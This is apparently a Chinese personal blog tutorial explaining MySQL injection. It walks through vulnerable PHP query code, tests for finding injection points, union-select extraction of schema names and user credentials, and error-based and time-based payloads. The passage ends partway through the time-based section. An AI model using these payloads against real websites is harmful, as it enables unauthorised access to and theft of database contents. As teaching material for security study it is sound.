<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
  <link rel="icon" type="image/png" href="/img/icon.jpg">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="description" content="">
  <meta name="author" content="13l00m">
  <meta name="keywords" content="">
  <title>mysql注入漏洞方法及原理整理 ~ 13l00m&#39;World</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css"  >
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css"  >
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css"  >

<link rel="stylesheet" href="/css/main.css"  >


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >


</head>


<body>
  <header style="height: 100vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>13l00m&#39;World</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>


</nav>

    <div class="view intro-2" id="background"
         style="background: url('/img/alone.png')no-repeat center center;
           background-size: cover;
           background-attachment: scroll;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期四, 十一月 28日 2019, 9:37 上午
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    8.2k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      33 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
            <div class="scroll-down-bar">
              <i class="fas fa-angle-down scroll-down-arrow"></i>
            </div>
          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="数据库注入漏洞类型整理"><a href="#数据库注入漏洞类型整理" class="headerlink" title="数据库注入漏洞类型整理"></a>数据库注入漏洞类型整理</h1><h2 id="写在开始"><a href="#写在开始" class="headerlink" title="写在开始"></a>写在开始</h2><ul>
<li>由于不同注入方法确定注入点后的获取相应数据方法相同，这里就统一写在一个地方</li>
<li>文章内容出现过的函数解释为自己所理解的，并不是最全的函数解释</li>
<li>最开始的是最详细的也是最基础的，避免重复,后面的只有原理代码和修复方案</li>
<li>下面说的所有注入他们的注入方法都不是固定的，要根据实际情况进行注入</li>
</ul>
<h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h2><p>在进行黑盒测试的过程中，常用于确定注入点的方法</p>
<ul>
<li>and 1=2–+#</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">"select * from users where id =$id"</span>;</span><br></pre></td></tr></table></figure>

<p><a href="http://localhost/?id=1" target="_blank" rel="noopener">http://localhost/?id=1</a> 属于正常查询 返回正常页面</p>
<p><a href="http://localhost/?iid=1" target="_blank" rel="noopener">http://localhost/?iid=1</a> and 1=1 返回正常页面</p>
<p><a href="http://localhost/?id=1" target="_blank" rel="noopener">http://localhost/?id=1</a> and 1=2 返回错误页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对应后端处理代码生成sql语句:</span><br><span class="line">select * from admin where id=1;</span><br><span class="line">查询失败的sql语句:</span><br><span class="line">select * from admin where id =1 and 1=2;</span><br></pre></td></tr></table></figure>

<p>原理解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当在sql语句后面添加 and 1=2 / and 1=1 的时候 </span><br><span class="line">其中的 1=1 相当于 True</span><br><span class="line">	  1=2 相当于 False</span><br><span class="line">	  and 相当于 且</span><br><span class="line">所以 当 and 前面的查询语句成立时 and 1=1 可返回正常内容 and 1=2 则返错误内容</span><br></pre></td></tr></table></figure>

<p>​        </p>
<ul>
<li>‘ </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">"select * from users where id='$id'"</span>;</span><br></pre></td></tr></table></figure>

<p><a href="http://localhost/?id=1" target="_blank" rel="noopener">http://localhost/?id=1</a> 属于正常查询 返回正常页面</p>
<p><a href="http://localhost/?iid=1&#39;" target="_blank" rel="noopener">http://localhost/?iid=1&#39;</a>  –+返回正常页面</p>
<p><a href="http://localhost/?id=1&#39;" target="_blank" rel="noopener">http://localhost/?id=1&#39;</a> 返回错误页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对应后端处理代码生成sql语句:</span><br><span class="line">select * from admin where id = &apos;1&apos;</span><br><span class="line">查询失败的sql语句:</span><br><span class="line">select * from admin where id =&apos;1&apos;&apos;</span><br></pre></td></tr></table></figure>

<p>原理解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当多输入一个单引号(&apos;) 时，最后一个单引号未闭合导致报错</span><br><span class="line">为了进一步判断网站是否存在注入漏洞，通常再单引号后面加注释符(&apos;--+)来注释掉未闭合的单引号</span><br><span class="line">如果返回正常页面，则可以确定注入点</span><br></pre></td></tr></table></figure>

<h3 id="【解释】为什么加-and-1-1-或-and-1-2-都返回正常界面"><a href="#【解释】为什么加-and-1-1-或-and-1-2-都返回正常界面" class="headerlink" title="【解释】为什么加 and 1=1 或 and 1=2 都返回正常界面"></a>【解释】为什么加 and 1=1 或 and 1=2 都返回正常界面</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sql语言中，字符型与非字符型比较：</span><br><span class="line">如果字符串开始存在整形数据（2admin）则拿出来比较的字符串为2</span><br><span class="line">如果不存在整形数据，默认为0</span><br><span class="line">例子:</span><br><span class="line">select 1=&apos;1admin&apos;; 返回1</span><br><span class="line">select 1=&apos;admin&apos;;  返回0</span><br></pre></td></tr></table></figure>

<ul>
<li>“</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">'select * from users where id="$id"'</span>;</span><br></pre></td></tr></table></figure>

<p>原理和上述相同，不复述</p>
<ul>
<li>‘)</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">"select * from admin where id =('$id')"</span>;</span><br></pre></td></tr></table></figure>

<p>原理和上述相同，不复述</p>
<ul>
<li>“)</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">'select * from admin where id =("$id")'</span>;</span><br></pre></td></tr></table></figure>

<p>原理和上述相同，不复述</p>
<h3 id="【经验】确定存在注入的情况下，快速判断为上述哪种类型"><a href="#【经验】确定存在注入的情况下，快速判断为上述哪种类型" class="headerlink" title="【经验】确定存在注入的情况下，快速判断为上述哪种类型"></a>【经验】确定存在注入的情况下，快速判断为上述哪种类型</h3><p>在参数后面加 \ 如果存在报错，大多可以爆出该参数的接收类型</p>
<p><img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/%E6%B3%A8%E5%85%A5/%E5%AE%9A%E4%BD%8D.png" srcset="undefined" alt></p>
<p>上面说了最基础的确定注入点的方法，下面说一下如何利用漏洞获取数据库里面的信息</p>
<h2 id="漏洞利用获取数据库信息"><a href="#漏洞利用获取数据库信息" class="headerlink" title="漏洞利用获取数据库信息"></a>漏洞利用获取数据库信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、获取字段信息</span><br><span class="line">	在参数后面加 order by +一个数字 eg: http://localhost/?id=1 order by 4</span><br><span class="line">	这里利用 order by 判断字段数量的原理</span><br><span class="line">		order by 在sql语句中用于指定字段列数排序，当输入的字段数大于实际最大字段数时，会产生报错。</span><br><span class="line">		所以利用 order by 可以判断某个数据表中的最大字段数</span><br><span class="line">		报错信息如下：</span><br><span class="line">			Unknown column &apos;11&apos; in &apos;order clause&apos;</span><br><span class="line">2、获取字段相应出现的位置</span><br><span class="line">	在第一步中已经获得了一个最大字段数，接下来利用 union select 1,2,3,4……,最大字段数 来判断每个字段相对位置</span><br><span class="line">	利用 union select 获取相应信息的原理:</span><br><span class="line">		union select 在sql语句中的作用是进行联合查询 例子： 两个数据表，每个数据表有相应的条件在进行数据输出		   的过程中可用union select进行两个表的拼接</span><br><span class="line">		</span><br><span class="line">mysql&gt; select * from admin where id=1;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">mysql&gt; select * from testt where id=1;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | testt    | testt    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">mysql&gt; select * from admin where id=1 union select * from testt;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">|    1 | testt    | testt    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line"></span><br><span class="line">		因为两个数据表的字段最大值相同，所以会正常输出，如果不同则会报错(如下)</span><br><span class="line">		The used SELECT statements have a different number of columns</span><br><span class="line">		union select 不仅仅能拼接字段相同的表，还可以拼接字段相同的任意数据</span><br><span class="line">		</span><br><span class="line">mysql&gt; select * from admin where id=1 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">		</span><br><span class="line">		当把sql语句输入到网站参数后面：http://localhost/?id=1 union select 1,2,3时</span><br><span class="line">		该网站后端程序仍返回正常数据</span><br><span class="line">		原因：就像上述表的查询相同，前后两个查询条件都为True，id=1的条件成立，所以网站返回正常内容，当构造的			   id！=True时，数据表返回的内容只有 union select 之后的数据</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=-1 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+	</span><br><span class="line">		当网页参数构造的id为False（-1） 则返回的内容为union select 进行拼接的内容</span><br><span class="line">		如：http://localhost/?id=-1 union select 1,2,3 返回值为 2</span><br><span class="line">		说明 username 这个字段在第二个位置，且 可以利用这个字段获取数据库里面的所有信息</span><br><span class="line">		</span><br><span class="line">3、获取当前的数据库名、数据库版本信息、数据库当前用户等</span><br><span class="line">	利用第二步拼接语句 union select</span><br><span class="line">	获取db名 http://localhost/?id=-1 union select 1,database(),3</span><br><span class="line">	获取db版本信息 http://localhost/?id=-1 union select 1,version(),3</span><br><span class="line">	获取db当前用户 http://localhost/?id=-1 union select 1,user(),3</span><br><span class="line">	database(),version(),user() 都是数据库里面的内置函数，想进一步了解去百度</span><br><span class="line">	</span><br><span class="line">	这里解释一下，为什么这些函数不放在1和3这两个位置：</span><br><span class="line">		因为第二步中的 union select 1,2,3 网页回显的信息只有2字段的数据信息，所以在进行获取数据的过程中，只		能利用2这个位置，实战中选择一个可以回显的数据字段即可，没有固定要求 </span><br><span class="line"></span><br><span class="line">4、获取所有数据库名（限制mysql版本&gt;=5.0）</span><br><span class="line">	sql语句：</span><br><span class="line">		select group_concat(schema_name) from information_schema.schemata;</span><br><span class="line">		解释为什么用 group_concat():</span><br><span class="line">			正常情况下查询出来的数据不止有一行，所以需要group_concat把多行数据拼接到一行里面</span><br><span class="line">		limit 可以替换 group_concat()</span><br><span class="line">			sql语言中的limit可以控制输出 limit 参数1,参数2</span><br><span class="line">			参数2 表示输出几行数据</span><br><span class="line">			参数1 表示输出第几块数据（块分多少由参数2控制）</span><br><span class="line">			所以相应的sql语句可以写为：</span><br><span class="line">				select schema_name from information_schema.schemata limit 0,1</span><br><span class="line">		from 的作用</span><br><span class="line">			from的作用也就是他的直译来自(哪个数据库)</span><br><span class="line">			from information_schema 就是选择 information_schema 这个数据库</span><br><span class="line">		. 的作用</span><br><span class="line">			information_schema.schemata中的 . 就是 information_schema 下的一个表</span><br><span class="line">			information_schema 与 schemata 可理解为父子关系</span><br><span class="line">			</span><br><span class="line">		一定要注意 information_schema 只有mysql版本&gt;=5.0才有，若小于这个版本，只能利用最基本的方法获取数据</span><br><span class="line"></span><br><span class="line">5、获取当前数据库所有表名</span><br><span class="line">	sql语句:</span><br><span class="line">		select group_concat(table_name) from information_schema.tables where table_schema=&apos;数据库名&apos;;</span><br><span class="line">	</span><br><span class="line">		where的作用是查询的条件，table_schema 为该表其中一个字段名不必深究为什么写这个（背背背）</span><br><span class="line">	</span><br><span class="line">	其他的跟第四步重复，不再复述</span><br><span class="line"></span><br><span class="line">6、获取表的字段名</span><br><span class="line">	sql语句:</span><br><span class="line">		select group_concat(column_name) from information_schema.columns where table_name=&apos;表名&apos;;</span><br><span class="line"></span><br><span class="line">7、获取字段信息</span><br><span class="line">	sql语句：</span><br><span class="line">		select group_concat(字段1，字段2，字段3) from 数据库名.表名</span><br><span class="line">		</span><br><span class="line">这就是一套比较基础 完整的sql注入漏洞利用方法及过程</span><br></pre></td></tr></table></figure>



<h2 id="常见的sql注入漏洞类型"><a href="#常见的sql注入漏洞类型" class="headerlink" title="常见的sql注入漏洞类型"></a>常见的sql注入漏洞类型</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml-函数报错注入"><a href="#updatexml-函数报错注入" class="headerlink" title="updatexml()函数报错注入"></a>updatexml()函数报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATEXML(XML_document, XPath_string, new_value); </span><br><span class="line"> </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line"></span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line"></span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line"></span><br><span class="line">作用：改变文档中符合条件的节点的值 </span><br><span class="line"></span><br><span class="line">报错原理：Xpath格式语法书写错误的话，就会报错</span><br></pre></td></tr></table></figure>

<p><a href="http://www.360doc.com/content/19/0515/11/2322_835832021.shtml" target="_blank" rel="noopener">更好的理解updatexml</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml的第二个参数相当于正常sql语句中的from where，都可以从大量数据中提取出特定想要的数据，我猜测这就是可以能够执行sql语句的原因（为什么能够执行sql语句我也不清楚，可能需要查看底层源码才能知晓）</span><br><span class="line"></span><br><span class="line">如何获取数据库里面的信息呢</span><br><span class="line">	select updatexml(1,concat(0x7e,database()),1)</span><br><span class="line">		concat() 用于拼接输出结果</span><br><span class="line">			select concat(1,2) -&gt; 输出结果为：12</span><br><span class="line">			这里为了在实战中方便找到返回的数据用了 concat()。真实情况写不写都可以返回数据，不是一成不变的			死格式</span><br><span class="line">		0x7e为 ~ 的十六进制</span><br><span class="line">			sql语言在查询过程中可用想查询字符串的十六进制带替字符串，避免单、双引号混乱造成程序问题</span><br><span class="line"></span><br><span class="line">上面已经获取到库名，该如何获取其他数据上面已经说的很详细了，这里不复述</span><br></pre></td></tr></table></figure>



<h4 id="extractvalue-函数报错注入"><a href="#extractvalue-函数报错注入" class="headerlink" title="extractvalue()函数报错注入"></a>extractvalue()函数报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Extractvalue(xml_frag,xpath_expr)</span><br><span class="line"></span><br><span class="line">xml_frag: 目标xml文档</span><br><span class="line"></span><br><span class="line">xpath_expr: 利用Xpath路径法表示的查找路径</span><br><span class="line"></span><br><span class="line">报错原理：Xpath格式语法书写错误的话，就会报错</span><br><span class="line"></span><br><span class="line">因为extractvalue()与updatexml()都是对xml文件进行操作，通过报错获取数据的原理相似，这里不再复述</span><br><span class="line"></span><br><span class="line">简单说一下如何构造sql语句进行获取数据库信息</span><br><span class="line"></span><br><span class="line">select extractvalue(1,concat(0x7e,database()));</span><br></pre></td></tr></table></figure>

<h4 id="floor-函数报错注入"><a href="#floor-函数报错注入" class="headerlink" title="floor()函数报错注入"></a>floor()函数报错注入</h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&mid=403404979&idx=1&sn=27d10b6da357d72304086311cefd573e&scene=1&srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据库:</span><br><span class="line"></span><br><span class="line">	select 1,2,3 from (select count(*),concat((select  												concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from 	information_schema.tables group by x)a</span><br><span class="line">	</span><br><span class="line">	语句中的floor(rand(0)*2)是什么意思？是为了产生一个不唯一的且能会出现重复的数字。rand()函数产生的数会随机	   产生0到1的小数，而加上参数变成rand(0)的时候，会产生一个确定的小数（我的理解）</span><br><span class="line">	</span><br><span class="line">	所以，rand(0)是为了得到一个确定的数，也就是执行第几次就是什么数据（我自己的理解），而*2再floor是为了得		到唯一的整数数据,将floor得到的数据范围限定在[0,1]之间</span><br><span class="line">	</span><br><span class="line">	再说报错，报了什么错呢，是主键重复，为什么会主键重复呢?这就group by 和 count(*)有关了，我们先看count(*)	 和group by组合一起的效果</span><br><span class="line">	</span><br><span class="line">	结果会显示每个列的次数，而这个列的内容，是唯一的主键。而在查询过程中，是先建立一张虚拟表，一行一行插入的，	 而插入时已经有重复主键了，那么，就会报错。当然，可能会问了，重复时，count(*)就加1了，为什么会主键重复呢？	  这就和rand()函数有关了，官方文档中提到，rand()函数在进行GROUP BY查询时会被计算多次，这里列举参考文档的解	释,我觉得说的很清楚：</span><br><span class="line"></span><br><span class="line">	1.查询前默认会建立空虚拟表</span><br><span class="line"></span><br><span class="line">	2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则			floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕</span><br><span class="line"></span><br><span class="line">	3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以		floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕</span><br><span class="line"></span><br><span class="line">	4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝		试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个	   主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</span><br><span class="line"></span><br><span class="line">	5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语  	 句才会报错的原因。</span><br><span class="line"></span><br><span class="line">获取表名:</span><br><span class="line">	select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from 				information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from 			information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">获取表内容：</span><br><span class="line">	select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) 	  from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">待补充（有点难懂）</span><br></pre></td></tr></table></figure>

<p>常用的为前三种，下面的稍微点一下</p>
<p>当mysql版本大于5.5.53时，下面出现的函数无法继续利用其进行报错注入</p>
<h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a><strong>multipoint()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from admin where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a><strong>multipolygon()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a><strong>linestring()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a><strong>multilinestring()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a><strong>exp()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<h4 id="NAME-CONST-函数报错注入（mysql版本-lt-5-1）"><a href="#NAME-CONST-函数报错注入（mysql版本-lt-5-1）" class="headerlink" title="NAME_CONST()函数报错注入（mysql版本&lt;5.1）"></a>NAME_CONST()函数报错注入（mysql版本&lt;5.1）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在mysql中，列名重复会报错，所以name_const()函数就是利用这一特性，重新定义一个重复的列名来让数据库报错。</span><br><span class="line"></span><br><span class="line">定义重复列名报错语句：</span><br><span class="line"></span><br><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br></pre></td></tr></table></figure>



<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><h4 id="什么是延时注入"><a href="#什么是延时注入" class="headerlink" title="什么是延时注入"></a>什么是延时注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在讲什么是延时注入之前呢，要先说一下为什么要用延时注入</span><br><span class="line">	之前存在sql注入漏洞的网站呢，你随便加个单引或双引就会报错，闭合方式也很好找。经过这几年痛苦的sql注入的磨		练，他们变机灵了……能够报错的网站程序越来越少，甚至有些存在注入点的网站不管加单引或双引他都会给你返回一个正	  常页面。所以呢，我们也进化了……出现了一个让sql命令执行成功的标志——sleep(),因为这个函数正常执行后能够让网站 	   出现延迟，比较直观</span><br><span class="line">什么是延时注入：</span><br><span class="line">	我上面一大堆不就讲的这个？</span><br></pre></td></tr></table></figure>

<h4 id="延时注入出现场景"><a href="#延时注入出现场景" class="headerlink" title="延时注入出现场景"></a>延时注入出现场景</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、确定存在注入点，且找到闭合方式</span><br><span class="line">2、用上述所有获取信息的sql语句无效（无回显数据）</span><br><span class="line">3、sleep函数未被禁用</span><br><span class="line">4、等我想起来再补充</span><br></pre></td></tr></table></figure>

<h4 id="涉及到的函数介绍及利用"><a href="#涉及到的函数介绍及利用" class="headerlink" title="涉及到的函数介绍及利用"></a>涉及到的函数介绍及利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入最常用的组合拳：（不含过滤的情况）</span><br><span class="line"></span><br><span class="line">sleep() if() substr() ascii() length()</span><br><span class="line"></span><br><span class="line">接下来简单解释一下各个函数的作用</span><br><span class="line"></span><br><span class="line">sleep(num)</span><br><span class="line">	</span><br><span class="line">	使用sleep函数可以延长sql语句执行时间:select * from table_name where column_name=ST and sleep(N) 延长											N秒</span><br><span class="line">	sleep有效的条件：</span><br><span class="line">		使用sleep的sql语句的查询结果不为空</span><br><span class="line">	</span><br><span class="line">	需要注意的几个点：</span><br><span class="line">		程序运行时间由sql语句的条件（where）来定</span><br><span class="line">			select sleep(N),column_name from table_name</span><br><span class="line">				每查询出一条数据延迟相对应的N秒,但出现的数据并不是说过了每条数据的延时时间就会出现，而是过了				   全部数据所需要sleep时间总和后，才会出现所有的数据</span><br><span class="line">			</span><br><span class="line">			select sleep(N),column_name from table_name where …………</span><br><span class="line">				上面这条sql语句的执行时间会根据where限制后出现的数据来定（数据量-&gt;程序执行时间）</span><br><span class="line">				</span><br><span class="line">	MySQL sleep过多的影响及解决方法:</span><br><span class="line">		影响：</span><br><span class="line">			严重消耗mysql服务器资源(主要是cpu, 内存)，并可能导致mysql崩溃。</span><br><span class="line">		解决方法:</span><br><span class="line">			SHOW GLOBAL VARIABLES LIKE &apos;wait_timeout&apos;;</span><br><span class="line">			SHOW GLOBAL VARIABLES LIKE &apos;interactive_timeout&apos;;</span><br><span class="line">			SET GLOBAL wait_timeout=30;</span><br><span class="line">			SET GLOBAL interactive_timeout=30;</span><br><span class="line">			wait_timeout, 即可设置睡眠连接超时秒数，如果某个连接超时，会被mysql自然终止</span><br><span class="line">			wait_timeout=30 #即设置mysql连接睡眠时间为100秒，任何sleep连接睡眠时间若超过100秒，将会被				mysql服务自然终止</span><br><span class="line">			</span><br><span class="line">if(条件,执行1,执行2)</span><br><span class="line">	与大多编程语言中的if函数相似，执行判断功能</span><br><span class="line">	条件：</span><br><span class="line">		返回值为bool类型</span><br><span class="line">	执行1：</span><br><span class="line">		条件参数返回值为 True</span><br><span class="line">	执行2：</span><br><span class="line">		条件参数返回值为 False</span><br><span class="line">	常用于与sleep的搭配：</span><br><span class="line">		if(条件,sleep(N),1)</span><br><span class="line">			如果条件成立,程序延时N秒（出现延时就代表存在注入点，且可利用这一点获取数据库信息）</span><br><span class="line">			如：if(1&lt;2,sleep(1),sleep(2)) 条件为True 程序延时1秒</span><br><span class="line"></span><br><span class="line">substr()</span><br><span class="line">	substr()两种表示法：</span><br><span class="line">		substr(string,num_start,num_length);</span><br><span class="line">			string为字符串</span><br><span class="line">			start为字符起始位置(起始位置为1)</span><br><span class="line">			length为截取字符长度</span><br><span class="line">		substr(String from N for M)</span><br><span class="line">			String为字符串</span><br><span class="line">			from 对应上面的num_start 字符起始位置</span><br><span class="line">			for 对应上面的 num_length 截断长度</span><br><span class="line">	使用substr()对字符串进行操作:</span><br><span class="line">		select substr(&apos;hello&apos;,2) -&gt; ello</span><br><span class="line">		select substr(&apos;hello&apos; from 2) -&gt; ello</span><br><span class="line">			如果忽略最后一个参数（截断长度）自动选取从开始位置到最后的字符串</span><br><span class="line">		select substr(&apos;hello&apos;,2,3) -&gt; ell</span><br><span class="line">		select substr(&apos;hello&apos; from 2 for 3) -&gt; ell</span><br><span 